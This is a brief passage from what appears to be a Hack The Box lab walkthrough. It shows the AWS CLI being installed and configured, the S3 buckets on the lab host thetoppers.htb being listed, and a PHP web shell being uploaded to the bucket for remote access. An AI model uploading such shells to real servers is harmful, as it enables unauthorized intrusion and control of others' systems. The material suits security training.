apt install awscli 
aws configure

We can list all of the S3 buckets hosted by the server by using the ls command
aws --endpoint=http://s3.thetoppers.htb s3 ls

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb